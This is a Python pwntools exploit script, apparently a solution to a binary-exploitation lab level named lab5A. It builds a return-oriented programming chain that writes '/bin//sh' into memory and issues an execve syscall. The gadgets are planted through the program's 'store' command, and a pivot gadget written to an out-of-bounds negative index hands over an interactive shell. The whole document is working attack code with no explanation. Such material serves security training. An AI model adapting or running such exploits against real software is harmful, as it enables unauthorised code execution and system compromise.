from pwn import *
import struct

r = process(["/tmp/transcen/r.sh", "/levels/lab05/lab5A"])
chain = []

### Constructing the "/bin//sh" string in memory ###


# /bin
chain.append(str(0x0809ffdf)) # nop ; ret                       
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret                 
chain.append(str(0x6e69622f)) # /bin 
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                    

chain.append(str(0x080aa04c)) # xchg eax, edx ; ret                 
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                    

chain.append(str(0x0809ffdf)) # nop ; ret                           
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret             
chain.append(str(0x080eb060)) # @ .data                             
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                    

chain.append(str(0x080a2ccd)) # mov dword ptr [edx], eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret


# //sh
chain.append(str(0x0809ffdf)) # nop ; ret
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
chain.append(str(0x68732f2f)) # //sh
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x080aa04c)) # xchg eax, edx ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x0809ffdf)) # nop ; ret
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
chain.append(str(0x080eb064)) # @ .data + 4
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x080a2ccd)) # mov dword ptr [edx], eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret


# NULL char

chain.append(str(0x0809ffdf)) # nop ; ret
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
chain.append(str(0x080eb068)) # @ .data + 8
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x08054c30)) # xor eax, eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x080a2ccd)) # mov dword ptr [edx], eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret


### Setting the arguments ###


# Setting ecx
chain.append(str(0x0806f3d1)) # pop ecx ; pop ebx ; ret
chain.append(str(0x080eb068)) # @ .data + 8

# Setting ebx and edx
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
chain.append(str(0x080eb060)) # @ .data


# set eax with the syscall nr
chain.append(str(0x08054c30)) # xor eax, eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x0809ffdf)) # nop ; ret
chain.append(str(0x08096f06)) # mov eax, 0xc ; pop edi ; ret

chain.append(str(0x080648d3)) # dec eax ; ret
chain.append(str(0x08048eaa)) # int 0x80





# 0x0806c0a9 : add esp, 4 ; ret
# 0x08049bb7 : add esp, 0x2c ; ret

# storing our ROP chain
storeIndex = 1
for gadget in chain:
    r.sendline("store")
    r.sendline(gadget)
    r.sendline(str(storeIndex))
    log.info("Index[{0}]: {1}".format(storeIndex, gadget))
    
    if ((storeIndex + 1) % 3 == 0):
        storeIndex += 2
    else:
        storeIndex += 1

# pivoting into our ROP chain
r.sendline("store")
r.sendline(str(0x08049bb7))
r.sendline(str(-11))

r.interactive()
